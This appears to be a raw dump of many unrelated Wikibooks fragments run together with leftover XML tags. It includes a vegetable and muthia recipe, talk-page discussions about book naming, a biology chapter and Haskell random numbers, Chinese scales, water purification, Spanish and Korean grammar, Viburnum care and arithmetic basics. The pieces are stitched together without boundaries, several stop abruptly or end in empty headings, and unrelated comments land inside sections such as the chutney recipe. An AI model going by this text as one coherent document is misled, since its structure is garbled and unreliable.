== Pickle juice ==
I found other recipes on the internet that call for pickle juice that use 1/4 '''cup''' of juice, so I inserted &quot;cup&quot; into the recipe as the measure.&amp;mdash;[[User:D'Ranged 1|D'Ranged&amp;nbsp;1]]&amp;nbsp;[[User talk:D'Ranged 1|&lt;sup&gt;'''talk'''&lt;/sup&gt;]] 06:26, 31 August 2012 (UTC)</text>

{{col-end}}

== Procedure ==
# Take ½ the amount thoghari dal and crush. Crush green chillies, garlic, and ginger. Take coriander powder and add all the other spices, add fresh grated coconut, and mix. Add coriander leaves and make a paste.
# Stuff the eggplant with the masala, and stuff the potatoes with masala.
# Add papdi first and then only take a bit of oil. Add mustard, hing, onion, ghenasu, potatoes, and all the other vegetables mixed in the masala, to add to the oil. Add a little water to keep from burning, and in the pressure cooker, just one whistle is enough to cook. 
# Garnish with coriander, coconut. Don't forget to add muthias before you cook.

=== Muthia (bonda) ===
Take ¼ cup [[Cookbook:Flour|wheat flour]], and 2 spoons [[Cookbook:Chickpea|channa powder]]. Add [[Cookbook:Rice Flour|rice flour]], [[Cookbook:Oil|oil]], [[Cookbook:Chili Powder|chilli powder]], [[Cookbook:Lemon|lemon]], [[Cookbook:Chili Pepper|green chillies]], [[Cookbook:Sugar|sugar]], and make a dough. Add [[Cookbook:Fenugreek|methi leaves]], make small, elongated balls, fry in oil, and keep aside.

{{see also|Cookbook:Bonda}}

=== Chutneys ===
To prepare these chutneys, grind the ingredients for each chutney and mix them together. It's best to make and serve all three, as they will each balance each other. Chutneys are optional.

You and I seem to be very similar. I also do the &quot;rinse and repeat&quot; thing you said you do. I think my interest in lucid dreaming is starting to increase again. I wrote an [http://wikinfo.org/wiki.php?title=Lucid_Dreaming:_An_Introduction_(by_Emanla_Eraton) introduction to lucid dreaming] based on your Wikibook.

== [[Investiture of the Gods]] ==

Hello Darin Fidika. There's a couple problems with this book, mostly just the naming convention stuff (we use a subpage protocol here, which is quite different from Wikipedia). For example, [[Investiture of the Gods (chapter 41)]] should be moved to [[Investiture of the Gods/Chapter 41]]. 

It's also not clear yet what you're doing exactly. Is this an annotation? Plot summary? Reader's Guide? Could you maybe include an introduction to the book (we thought it was fiction at first)? 

Have a look at [[Wikibooks:Wikibooks for Wikipedians]] to get a better handle on some of the naming conventions and link styles. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 11:22, 25 March 2007 (UTC)

Hello SB_Johnny. My chapter articles serve as plot summaries, and are mainly to be used as a trivial-general informational process for my character articles on Wikipedia. I have now added an introductory paragraph to my newest article [[Investiture of the Gods/Chapter 42]] (which may or may not truly justify iteself). Just be sure to tell me if there are any additional problems that may arise within the future my friend. Thanks.

[[User:Darin Fidika]] 25 March 2007 (EST)

: I notice your creating a lot of new pages which serve only to redirect to this book. Wikibooks doesn't use ambiguous pages nor redirects for similar names like Wikipedia does. All these redirects should really be deleted. Also you ought to be using more descriptive title names then &quot;Chapter 41&quot;, so that if the order change, all that has to be changed is the table of contents and not the names of the pages. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 15:55, 15 July 2007 (UTC)


Thank you for your suggestions, Darklama. I will take an active look into what you have stated.
--[[User:Darin Fidika]] 15 July 2007 (EST)

Please clean up the organization of this book. I tried to start renaming pages to comply with [[WB:NP]], but it's so messy that I can't finish the job. Judging by what you've done so far, there should be one page for each chapter, yet you have multiple copies for some modules - one with IOTG/Chapter# and one with IOTG (Chapter#). Please consolidate everything into the set of pages with a hierarchical structure. If you need help, or if history merges or deletes are required, please ask on my talk page.

      <text xml:space="preserve">Chinese music, unlike western music, uses a five-tone scale known as the ''pentatonic'' scale. The easiest way to see this on a piano is to play the black keys only. The scale will sound oriental. This however, is an oversimplification, as in many Chinese instruments, a Western Diatonic scale is achievable, and 7-note scales are frequently used. Also, the music of Ethnic Minorities in China is often closely related to that of it's neighbours, such that microtonal adjustments of pitch are also used.

In the Chinese pentatonic, the most commonly used scale is usually D. The notes are then as follows:

D E F# A B  D

      <comment>/* How */  Added Distilling with a link</comment>
      <text xml:space="preserve">== Why ==

Water is absolutely necessary for human survival. At the same time water can contain many dangerous pathogens.

== How ==

* Boiling - will sterilize the water by killing bacteria in the water.  If you collect the steam it will have less of a chance of carrying chemicals.  By using a lower temperature less chemicals will rise with the steam.  The water doesn't even have to boil if you are collecting the evaporating water. 
* Distilling - [http://www.i4at.org/surv/distill.htm See the library's version]
* Rain water, melted snow, and new dew are usually safe.  Rain water can be collected from run off from tents and or homes, although for drinking I would recommend purifying the water first.
* Water purification tablets.
* Water purification pumps.  Try to use water that is already clear or do a pre-filtering with a cloth to remove dirt for better taste and a lower likelihood of clogging your filters.
* Solar stills can be used either built into the ground or using a container in a sunny location.  

Built into the ground all that is required is a piece of clean plastic to cover the hole, a catch basin and a long tube if            possible.  The sunnier the location the more water will accumulate on the bottom side of the plastic.  You would place you catch basin in the hole cover it with the plastic and place a small stone directly above the catch basin.  You then place the tube in the catch basin and drink through the tube.  If the soil is somewhat dry or you want to increase the production of water you can add moist plant matter or water that you would not want to drink directly including salt water and urine.  Be extremely careful to keep your catch basin clean on the inside.  Salt water should never be ingested and urine can be, I don't recommend it but you can get away with it for a while in an emergency.

If you use a container as a solar still it works almost the same as above with the exception that you must put liquids in the outer container to create the drinking water.  After that it is the same.  If you use a clearer outer container it can speed up production of drinking water.  Mirrors can also be used to increase the amount of light getting to the water that you are trying to evaporate.  Keep in mind that you are not trying to boil the water as that can increase the chemicals that evaporate with the water.

== Ser vs estar ==

To appreciate the difference between Ser and Estar, we must first realize that both words mean &quot;to be&quot;. Generally, Estar is used to talk about the condition and location of things, while Ser is used for basic characteristics---like origin, identity, occupation, etc.---and miscellaneous other things like date and time. 

Many times, people will use the terms 'temporary' and 'permanent' to distinguish between Estar and Ser, respectively. However, that approach can cause problems. For example, in Spanish, when someone dies we use Estar to say they're dead: &quot;Está muerto&quot;. Certainly, death isn't temporary; rather, we use Estar because we're describing their ''condition''.

I did some more changes on the organs and tissues of the lymph system. I am glad someone added the extra material.. it is good. I love the way the chapter is shaping up. I added something about vitiligo and hay fever. And made some bullets. I am still concerned about the outline that is still there - about bacteria, etc. Should we just delete it?

==Lymph system move==
I moved the section about the lymph system from the cardiovascular chapter to this one- I just put it in and I think it probably does some repeating- feel free to delete or change it- We just felt that it made more sense in this chapter rather than in cardiovascular [[User:Stephanie greenwood|Stephanie greenwood]] 17:24, 19 March 2007 (UTC)

===Adaptive Defense===
The section on adaptive defense definitely needs some work.  I spent a lot of time on it, but it needs a lot more organization.  If I don't get to it, will someone please take a look at it?  --[[User:Shaleneroberts|Shaleneroberts]] 01:58, 18 March 2007 (UTC)

We have two sections on T cells... can we combine them? It looks like the 2nd section is cut from wikipedia or something. I don't really understand it very well. Please feel free to reorganize things however you see fit![[User:Never2late|never2late]] 02:24, 18 March 2007 (UTC)

Hi guys I hope I am not messing up what you got going I just thought the things I added were important enough to go into the chapter if we need to move them somewhere else I am fine with that.  --[[User:Shellybird2]]

I just added a section on organs - kind of anatomy... but thought it was useful. Please feel free to move things around or remove parts of the outline we don't need. It is looking good!!!! I like all new stuff!!!!!! [[User:Never2late|never2late]] 05:24, 18 March 2007 (UTC)

== Suggested T cell revision ==

Here is what the T cell sections currently look like, along with some suggested revisions. If you want to comment on these changes--reasons for or against, please do so.

==Different Types of T Lymphocyte Cells==
I HAVE DELETED THE BELOW THAT NEEDED TO BE DELETED, WORKING ON REWRITING STUFF.--[[User:Shaleneroberts|Shaleneroberts]] 17:12, 19 March 2007 (UTC)
Several different subsets of T cells have been described, each with a distinct function.

''Cytotoxic T cells'' (Tc cells) destroy virally infected cells and tumor cells, and are also implicated in transplant rejection. These cells are also known as CD8+ T cells, since they express the CD8 glycoprotein at their surface. 
:&lt;font color=ff0000&gt;I like that there is an explanation for why they are called CD8+, and in the next paragraph why Th cells are also called CD4+. I will probably refer to Tc and Th cells rather than CD8+ and CD4+ in lecture, but I would like to keep these explanations in anyway. Especially when reading about HIV you commonly hear about CD4+ cells.

''Helper T cells'', (Th cells) are the &quot;middlemen&quot; of the adaptive immune system. Once activated, they divide rapidly and secrete small proteins called cytokines that regulate or &quot;help&quot; the immune response. These cells (also called CD4+ T cells) are a target of HIV infection; the virus infects the cell by using the CD4 protein to gain entry. The loss of Th cells as a result of HIV infection leads to the symptoms of AIDS. 

''Memory T cells'' are a subset of antigen-specific T cells that persist long-term after an infection has resolved. They quickly expand to large numbers of effector T cells upon re-exposure to their cognate antigen, thus providing the immune system with &quot;memory&quot; against past infections. '''['''Memory T cells comprise two subtypes: central memory T cells (TCM cells) and effector memory T cells (TEM cells).''']''' Memory cells may be either CD4+ or CD8+. 
:&lt;font color=ff0000&gt;I would probably delete the second to last sentence [I put brackets around it], just because I don't plan on distinguishing between TCM and TEM cells.

''Regulatory T cells'' (Treg cells), formerly known as suppressor T cells, are crucial for the maintenance of immunological tolerance. Their major role is to shut down T cell mediated immunity towards the end of an immune reaction and to suppress auto-reactive T cells that escaped the process of negative selection in the thymus. '''['''Two major classes of regulatory T cells have been described, including the naturally occurring Treg cells and the adaptive Treg cells. 
Naturally occurring ''Treg cells'' (also known as CD4+CD25+FoxP3+ Treg cells) arise in the thymus, whereas the adaptive Treg cells (also known as Tr1 cells or Th3 cells) may originate during a normal immune response. Naturally occurring Treg cells can be distinguished from other T cells by the presence of an intracellular molecule called FoxP3. Mutations of the FOXP3 gene can prevent regulatory T cell development, causing the fatal autoimmune disease IPEX.''']'''
:&lt;font color=ff0000&gt;I would delete all info within brackets, just because I think it is beyond the scope of our class. It would be nice if the first part of the paragraph could be explained in simpler terms (or maybe just a slightly longer explanation would help). 

Natural ''Killer T cells'' (NKT cells) are a special kind of lymphocyte that bridges the adaptive immune system with the innate immune system. Unlike conventional T cells that recognize peptide antigen presented by major histocompatibility complex (MHC) molecules, NKT cells recognize glycolipid antigen presented by a molecule called CD1d. Once activated, these cells can perform functions ascribed to both Th and Tc cells (i.e. cytokine production and release of cytolytic/cell killing molecules). 
:&lt;font color=ff0000&gt;I would end here, try to give a bit simpler explanation of NKT cells, and delete the following.

γδ T cells represent a small subset of T cells that possess a distinct TCR on their surface. A majority of T cells have a TCR composed of two glycoprotein chains called α- and β- TCR chains. However, in γδ T cells, the TCR is made up of one γ-chain and one δ-chain. This group of T cells is much less common (5% of total T cells) than the αβ T cells, but are found at their highest abundance in the gut mucosa, within a population of lymphocytes known as intraepithelial lymphocytes (IELs). The antigenic molecules that activate γδ T cells are still widely unknown. However, γδ T cells are not MHC restricted and seem to be able to recognise whole proteins rather than requiring peptides to be presented by MHC molecules on antigen presenting cells. Some recognize MHC class IB molecules though. Human Vγ9/Vδ2 T cells, which constitute the major γδ T cell population in peripheral blood, are unique in that they specifically and rapidly respond to a small non-peptidic microbial metabolite, HMB-PP, an isopentenyl pyrophosphate precursor.

==THE FUNCTIONS OF T LYMPHOCYTES==
T lymphocytes cells help with all components of the immune system, including cell elemination by killer T cells and maintaining roles by helper and suppressor T cells. Although the specific mechanisms of activation vary slightly between different types of T cells, the &quot;two-signal model&quot; in CD4+ T cells holds true for most. '''['''Activation of CD4+ T cells occurs through the engagement of both the T cell receptor and CD28 on the T cell by the Major histocompatibility complex peptide and B7 family members on the APC respectively. Both are required for production of an effective immune response; in the absence of CD28 co-stimulation, T cell receptor signalling alone results in anergy. The signalling pathways downstream from both CD28 and the T cell receptor involve many proteins.''']'''
:&lt;font color=ff0000&gt;Starting with the info in brackets, and continuing down to the next several paragraphs:  This is good information and nicely written, but largely goes beyond the scope of our class. I would delete all of it and give a simpler explanation of what T cells do--their role in fighting viruses and cancer, for instance.

The first signal is provided by binding of the T cell receptor to a short peptide presented by the major histocompatibility complex (MHC) on another cell. This ensures that only a T cell with a TCR specific to that peptide is activated. The partner cell is usually a professional antigen presenting cell (APC), usually a dendritic cell in the case of naïve responses, although B cells and macrophages can be important APCs. The peptides presented to CD8+ T cells by MHC class I molecules are 8-9 amino acids in length; the peptides presented to CD4+ cells by MHC class II molecules are longer, as the ends of the binding cleft of the MHC class II molecule are open.

The second signal comes from co-stimulation, in which surface receptors on the APC are induced by a relatively small number of stimuli, usually products of pathogens, but sometimes breakdown products of cells, such as necrotic-bodies or heat-shock proteins. The only co-stimulatory receptor expressed constitutively by naïve T cells is CD28, so co-stimulation for these cells comes from the CD80 and CD86 proteins on the APC. Other receptors are expressed upon activation of the T cell, such as OX40 and ICOS, but these largely depend upon CD28 for their expression. The second signal licenses the T cell to respond to an antigen. Without it, the T cell becomes anergic and it becomes more difficult for it to activate in future. This mechanism prevents inappropriate responses to self, as self-peptides will not usually be presented with suitable co-stimulation.

The T cell receptor exists as a complex of several proteins. The actual T cell receptor is composed of two separate peptide chains which are produced from the independent T cell receptor alpha and beta (TCRα and TCRβ) genes. The other proteins in the complex are the CD3 proteins; CD3εγ and CD3εδ heterodimers and most importantly a CD3ζ homodimer which has a total of six ITAM motifs. The ITAM motifs on the CD3ζ can be phosphorylated by Lck and in turn recruit ZAP-70. Lck and/or ZAP-70 can also phosphorylate the tyrosines on many other molecules, not least CD28, Trim, LAT and SLP-76, which allows the aggregation of signalling complexes around these proteins.

Phosphorylated LAT recruits SLP-76 to the membrane, where it can then bring in PLCγ, VAV1, Itk and potentially PI3K. Both PLCγ and PI3K which act on PI(4,5)P2 on the inner leaflet of the membrane to create the active intermediaries di-acyl glycerol (DAG), inositol-1,4,5-trisphosphate (IP3) and phosphatidlyinositol-3,4,5-trisphosphate (PIP3). DAG binds and activates some PKCs, most importantly in T cells PKCθ, which is important for activating the transcription factors NF-κB and AP-1. IP3 is released from the membrane by PLCγ and diffuses rapidly to activate receptors on the ER which induce the release of calcium. The released calcium then activates calcineurin, and calcineurin activates NFAT, which then translocates to the nucleus.
:&lt;font color=ff0000&gt;Those are my suggestions. I'm going to leave it up to you (the students) to actually make the revisions. You don't have to agree with me--you can change the information more or less than this. This chapter is looking great! [[User:Provophys|Provophys]] 15:21, 19 March 2007 (UTC)

      <text xml:space="preserve">{{:Korean/Navigation panel|Grammar}}

== Demonstrative object pronouns ==

Korean has three demonstrative pronouns for objects:
* [[wikt:이것|이것]] (this, ''i-geot'') is used when the object is nearby the speaker.
* [[wikt:그것|그것]] (that, ''geu-geot'') is used when the object is near the listener.  It is also used when the speaker already mentioned the object.
* [[wikt:저것|저것]] (that [over there], ''jeo-geot'') is used when the object is far from the speaker and the listener.

Examples:
*'''이것'''은 이상하다: '''This''' is strange.
*'''그것'''은 이상하다: '''That''' is strange.
*'''저것'''은 이상하다: '''That [over there]''' is strange.
----
When [[wikt:은|은]] (the topic marker) follows those pronouns, they are often contracted as follows:
* [[wikt:이건|이건]]: contraction of [[wikt:이것|이것]]은
* [[wikt:그건|그건]]: contraction of [[wikt:그것|그것]]은
* [[wikt:저건|저건]]: contraction of [[wikt:저것|저것]]은

Examples:
*'''이건''' 이상하다: '''This''' is strange.
*'''그건''' 이상하다: '''That''' is strange.
*'''저건''' 이상하다: '''That [over there]''' is strange.
----
When [[wikt:이|이]] (the subject marker) follows those pronouns, they are often contracted as follows:
* [[wikt:이게|이게]]: contraction of [[wikt:이것|이것]]이
* [[wikt:그게|그게]]: contraction of [[wikt:그것|그것]]이
* [[wikt:저게|저게]]: contraction of [[wikt:저것|저것]]이

Examples:
*'''이게''' 이상하다: '''This''' is strange.
*'''그게''' 이상하다: '''That''' is strange.
*'''저게''' 이상하다: '''That [over there]''' is strange.

== Demonstrative personal pronouns ==
Korean has three demonstrative pronouns for people.
* [[wikt:이분|이분]] is used when the person is nearby the speaker.
* [[wikt:그분|그분]] is used when the person is near the listener.
* [[wikt:저분|저분]] is used when the person is far from the speaker and the listener.

Examples:
*'''이분''' 이 누구입니까?: Who is '''this''' person?
*'''그분''' 이 누구입니까?: Who is '''that''' person?
*'''저분''' 이 누구입니까?: Who is '''that''' person [over there]?

== Demonstrative determiners ==
Also [[wikt:이|이]], [[wikt:저|저]], and [[wikt:그|그]] can be used in front of nouns:
* '''이''' [[wikt:식사|식사]]가 맛있어요.
*: '''This''' [[wikt:dish|dish]] is delicious.
* '''그''' [[wikt:연필|연필]]을 이용해요?
*:  Are you using '''that''' [[wikt:pencil|pencil]]?
* '''저''' [[wikt:식당|식당]]에 갑시다.
*:  Lets go to '''that''' [[wikt:restaurant|restaurant]].

      <text xml:space="preserve">{{:Korean/Navigation panel|Grammar}}

English often uses prepositions to show the relationship of a noun to the rest of the sentence.  Examples are &quot;'''to''' home&quot;, &quot;'''across''' the river&quot;, &quot;'''on''' the street&quot;, etc.  Like English prepositions, Korean particles are short words that describe spacial relationships between objects and designate things like the subject and direct object.  Unlike English prepositions, though, Korean particles come after the words they modify (hence their alternative name: &quot;'''post'''positions&quot;).

Consider the following sentence:
* Korean: '도서관이 [[wikt:시장|시장]] '''옆에''' 있어요.'
* Literally: 'library [[wikt:market|market]] '''next to''' is.'
* English: 'The library is '''next to''' [[wikt:market|the market]].'

In Korean, the phrase 옆에 ('next to') is placed after 시장 ('the market').

Below is a basic list of postpositions and words to describe spatial relationships.
* [[wikt:에게|에게]] (&quot;to [a person]&quot;)
* [[wikt:에서|에서]] (&quot;from&quot; or &quot;at&quot;)
* [[wikt:을|을]]/[[wikt:를|를]] (direct object)
* 근처   nearby
* 멀다   be far from here
* 가깝다 be near/close
* 위     above/on
* 아래   below
* 앞     in front of
* 뒤     behind
* 옆     beside/by/next to
* 안     inside

Here are some examples of how to use these postpositions.
* 새가 지붕 위에 있어요.  There's a bird on the roof.
* 어머니는 주방 안에 있어요.  Mother is in the kitchen.

Postpositions dealing with time
*동안 - for
*는 동안 - while

Example sentences
*30분동안 잤어요. I slept for 30 minutes.
*나는 말하는 동안 영화를 봤어요. I talked while watching a movie.

      <text xml:space="preserve">I understand that random numbers are a slightly more advanced topic in Haskell.  However, I think most people who have programmed before and who are interested in trying Haskell will want/need random numbers.  The information in this page is fine, but I thought it was a bit too technical for somebody who just wanted to get random numbers working.  He/she may decide to read the theory later.

I suggest having an introductory section which is just copy &amp; paste (like the rest of the wikibook).  I had to google around for a while until I could finally be able to read the page.

A few examples with rolling a die or tossing a coin should suffice.

:That sounds good.  How about giving it a shot?  It's ok, nay, better if you don't feel yourself to be completely at ease yet, because you know what interests new Haskellers most.  Somebody can always come in to clean up.  -- [[User:Kowey|Kowey]] 08:26, 18 March 2007 (UTC)

== Examples don't work. ==

Hi, i'm pretty new to haskell, but i understood the text, and i copied the exact examples in a file to test them. They don't work. I can't get a working RNG, no matter what i do. The examples always give type errors.

Simply try to put the stuff in a .hs-file yourself, and run/open it with hugs. Then - if you get this far - try using them together to simply recreate a normal generation and outputting (putStr (show r)) of one random number ... No RNG for me. :((

If yu can, try to change the page in a way that lets others quickly try the examples. :)

:Thanks for that.  If you're on IRC, could you maybe paste what you had on http://hpaste.org and see if the #haskell'ers can help?  I'm too busy to work on this, sadly -- [[User:Kowey|Kowey]] 06:55, 16 April 2007 (UTC)

== All I want is a simple example ==

Hi, I'm new as well, and I just don't understand what's currently here.  I just want to get something that I can type into the hugs interpreter and see random numbers (of any range) come out.  I'm not interested in function definitions, I just need a working example.  When I finally get one, maybe I'll update this page, but I don't have the knowledge to do so right now. Any guru's out there who could supply one?

:Hey there.  I copied this from the Haskell cookbook:
 main = do
   gen &lt;- getStdGen
   ns &lt;- randoms gen
   print $ take 10 ns

      <text xml:space="preserve">== Suggestions ==

This book is definitely a good undertaking, but it looks a bit like a blog at the moment... Maybe the chapters/sections sould either be chronological (2003, 2004, etc.), or topical (what kind of books were being written in the beginning/middle/lately, policy evolution, etc.) rather than the &quot;Direction lost and rebirth&quot; and &quot;Upheaval and redefinition&quot;? It seems to be focused heavily on the problems, but even while those problems were going on, there has always been steady growth in the background. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 11:12, 18 March 2007 (UTC)

:Of course you are only looking at it from a very early stage of development.  I disagree that the sections should be isolated by year, as events that have taken place here on Wikibooks have trancended arbitrary time breaks.... even though I have seen relationships between academic school years and activity here on Wikibooks.  Major surges in interest tend to happen about May and September of each year, and January tends to be a period of time when people get either burned out or concentrate on other aspects of their life.  This tendency is not nearly as pronounced as it was for say the USENET news groups in the early 1990's.

:Perhaps this book could discuss what kinds of book were being written in various periods of the history of Wikibooks, but I am pointing out that there have been some very major controversies that do need to be covered (from of course an NPOV).  My argument is that much of the history of Wikibooks has been an examination of what kinds of content would be considered acceptable on this project, and that attitude has been reflected by the personalities of the active participants during each of those time periods.  Of course, this is a POV as much as anything else.  There certainly can be what I would define as &quot;generations&quot; of users that have been working on Wikibooks over the past four years, and I can define loosly (not completely) some of those participants based on &quot;political upheavals&quot; where the newer users sort of revolt against the old hands and push the project into new directions.  And this is happening even today.

:I find it especially interesting (and revealing) that even the notion of NPOV was strongly questioned at the beginning of this project, and even Jimbo conceeded some rather interesting viewpoints about that topic.  I can also point out that there are what I would call three sorts of concerns in the early history of this project that from a historical perspective are interesting to explore:

* Perrenial Concerns - This would be issues of things like copyright licensing and fair use.  These issues appeared in the very beginning of Wikibooks and simply seem unsolvable.

* Resolved Issues - Several major categories of content have been removed (even if I am fighting to get video game book back... it is gone for now).  Most notably is that the issue of fiction is so completely agreed upon that except for a few gadflys it isn't even being mentioned at all as an issue any more and hardly controvercial.  This was a major issue in the beginning of this project.

* Non-issues - Some worries simply have not even been raised at all, or have been resolved because existing structures in Wikibooks has dealt with them.  Most notably the issue of Pornography on Wikibooks.  It simply isn't here.  Why that is the case is something that perhaps could be explored.

:One of the very interesting little tidbits of the history of Wikibooks that I've discovered (and didn't know about until this past week) was a completely different Wiki that was absorbed into Wikibooks.  A user named April on Wikipedia created a science textbook wiki on her own (and independent of the WMF.... the relationship between the WMF and Wikibooks is very interesting and a revelation to me as well... but moving on.)  This Wiki pre-dated Wikibooks by nearly a year, and developed its own separate community, many of which did end up bringing nearly all of its content (that Wiki was licensed under the GFDL) over to here on Wikibooks and provided one of the critical seed groups that helped to develop some of the early science textbooks.  This Wiki is unfortunately down now, although you can go through some of the content pages with the internet archives.  I have not seen this group mentioned anywhere on any other short history of Wikibooks.  Much of the culture of Wikibooks can be attributed to this original science textbook wiki, including a certain attitude of independence from Wikipedia (as it was a completely independent group).

:I would like to do a chronlogical book, but am open to any reasonable suggestions on how to accomplish that task.  As I said, I want to avoid the use of dates but any other reasonable suggestion, including the titles of the sections, is very most definitely up for discussion.

:Before I even commit to the outline, I would like to do some significant research in terms of gathering what will end up as bibliographic resources and original documents.  I've started that process and in doing so has changed the direction I would like to go with this book.  There are resources such as Textbook-l and [[WB:SL|Staff Lounge]] that provide some very interesting backgrounds into this project, but I don't want to be shaped by those discussions either.  And some of the early and prominent users with their user talk pages are also something that might be fun to try and cull some interesting historical tidbits.

:This trancends nearly all of the Wikimedia projects, and I've found important resources on Meta and Wikipedia that are also very interesting.  Gathering that information is going to take time, as it certainly is not laid out in any organized fashion.  That is precisely what this book is going to try and accomplish.  --[[User:Robert Horning|Rob Horning]] 16:24, 18 March 2007 (UTC)

::Good comments there, but what I was really getting at is the way the suggested initial outline seems to be more about trauma and drama, rather than the evolution that has gone on continually despite the trauma and drama :). It's also a bit misleading, since it sort of lays out the history as &quot;we had some hard times, but now we're moving forward&quot;. Wikis always have hard times, while at the same time having good times... Wikipedia is constantly undergoing small revolutions, and the only reason (IMO) that they happen more often there is that there are just a heck of a lot more people there. I guess the only historical period we could really point to (on our project or any of the other WM projects) would be that short but sweet &quot;age of ideals&quot; that happens when they first get started (Wikiversity seems to me to be in that phase now), which gradually comes to an end as opinions come to the fore on inclusion/exclusion, structure, user rights/behavioral policy, etc (personally I think we all need to keep a close eye on Wikipedia for easy lessons, rather than learning them all &quot;the hard way&quot; here). 

::I guess rather than dividing the issues into the solved, unsolved, and perennial, I'd rather pursue a more &quot;content-oriented&quot; approach. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 17:41, 18 March 2007 (UTC)

      <text xml:space="preserve">I have now unblocked this IP address.  As there is no history of vandalism from this address then I don't believe it should be blocked.  I don't agree with the Wiki project against &quot;open proxies&quot; as IP addresses often change ownership and blocking addresses will turn people away from Wiki projects and frustrate them more.  Blocks should only be used against usernames and IP addresses with a proven vandalism record.  The current method of blocking open proxies is like castrating all men just because some men are sexually violent.

This IP address has had frequent use on Wikipedia.  Much of the use is on a variety of pages suggesting that this is indeed a shared IP address and possibly at a cybercafe.  Some of the Wikipedia edits were possible vandalism but much of it was constructive.  If any administrator with 'check user' rights can investigate further then this may be helpful.

'''Viburnum''' (''Viburnum'') is a genus of about 150-175 species of shrubs or (in a few species) small trees that were previously included in the family Caprifoliaceae. Genetic tests by the Angiosperm Phylogeny Group showed however that they are correctly classified in the family Adoxaceae.

They are native throughout the temperate Northern Hemisphere, with a few species extending into tropical montane regions in South America and southeast Asia. In Africa, the genus is confined to the Atlas Mountains.

==Description==
The leaves are opposite, simple, and entire, toothed or lobed; cool temperate species are deciduous, while most of the warm temperate species are evergreen. Some species are densely hairy on the shoots and leaves, with star-shaped hairs.

The flowers are produced in corymbs 5-15 cm across, each flower white to cream or pink, small, 3-5 mm across, with five petals, strongly fragrant in some species. The gynoecium has 3 connate carpels with the nectary on top of the gynoecium. Some species also have a fringe of large, showy sterile flowers round the perimeter of the corymb to act as a pollinator target.

The fruit is a spherical, oval or somewhat flattened drupe, red to purple, blue, or black, and containing a single seed; they are eaten by birds and other wildlife, and some are edible for humans (though many others are mildly poisonous to people). 

[[Image:Viburnum davidii.jpg|thumb|right|''Viburnum davidii'', an evergreen species from China]]
==Growing Conditions==
Viburnums grow best in moist, fertile, well-drained, and deep soils. Sunlight requirements vary according to species.

==Species==

* The hybrid ''Viburnum × bodnantense'' (''V. farreri'' × ''V. grandiflorum'') is particularly popular for its strongly scented pink flowers on the leafless deciduous shoots in mid to late winter.
* ''Viburnum × burkwoodii'' (''V. carlesii'' × ''V. utile'')
* ''Viburnum × carlcephallum'' (''V. carlesii'' × ''V. macrocephalum'')
* ''Viburnum carlesii'' has flowers that look somewhat like snowballs, excellent fragrance, dense structure, and reddish leaves in autumn.
* ''Viburnum davidii'' is an evergreen species from China with blue fruit.
* ''Viburnum dentatum'' has flat-topped flowers, bluish fruit, and reddish leaves in autumn. It is somewhat salt tolerant. The cultivar 'Blue Muffin' is more compact than the species and has fruit that are a deeper blue than the species.
* ''Viburnum dilatatum'' has flat-topped flowers, reddish leaves in autumn, and bright red fruit that persist into winter.
* ''Viburnum × juddii'' (''V. bitchiuense'' × ''V. carlesii'')
* ''Viburnum plicatum'' has white, snowball-like flowers, textured leaves, reddish-black fruit, and can grow quite large under ideal conditions.  The species can tolerate shade, but not drought.  The variety ''tomentosum'' has flat-topped flowers but is otherwise the same as the species.
* ''Viburnum × pragense'' (''V. rhytidophyllum'' × ''V. utile'')
* ''Viburnum × rhytidophylloides'' (''V. lantana'' × ''V. rhytidophyllum'')
* ''Viburnum rhytidophyllum'' is a popular evergreen species, grown mainly for its foliage effect of large, dark green leathery leaves with strongly wrinkled surface. This is the parent species of two popular hybrid cultivars known as 'Alleghany' and 'Pragense'. 'Alleghany' was selected from a hybrid between ''V. rhytidophyllum'' and ''V. lantana'' 'Mohican' (in 1958, at the US National Arboretum).
* ''Viburnum setigerum'' has upright, coarse structure and orange to reddish-orange fruit.
* ''Viburnum sieboldii'' has coarse, open structure, flat-topped flowers, reddish-black fruit, and can grow as a small tree.

==Uses==
Many species of viburnum have become popular as garden or landscape plants because of their showy flowers and berries and generally good autumn color. 

In prehistory, the long straight shoots of some viburnums were used for arrow shafts.

==Maintenance==
Prune after flowering, as the flower buds are produced the previous year.

==Propagation==
Propagated through cuttings or seed, hybrids and some cultivars may be grafted.

Most species can be grown as cutback shrubs.

==Pests and diseases==

      <text xml:space="preserve">Whether you're a scientist or a shopper you need arithmetic. There are all sorts of situations where it is useful to be able to count, measure and communicate quantities. Arithmetic is the study of numerical quantities. At least a basic understanding of arithmetic is fundamental in the study of algebra and all other mathematical studies. This book assumes that the reader already understands some mathematics but wishes to relearn it in a more formal manner.

== Basic Operations ==
There are four basic operations one can perform on different numeric quantities (as well as other mathematical objects which you will encounter later). These are:
*addition (+)
*subtraction (−)
*multiplication (×)
*division (÷)

== Equals ==

It is also important to understand that the equals sign (in this book, '=' ) means that the things on both sides are of equal value, and that = is not an operator.

When you see an = sign, say to yourself ''Same value, different appearance''.

      <text xml:space="preserve">The ability to count things has been essential throughout the ages. Over time, several systems for counting things were developed; the first of which was the '''natural numbers'''. As a set, the natural numbers can be written like so: {1, 2, 3, . . .}. If we also include the number zero (0) in the set, it becomes the '''whole numbers''': {0, 1, 2, 3, . . .}.

==Formulation==
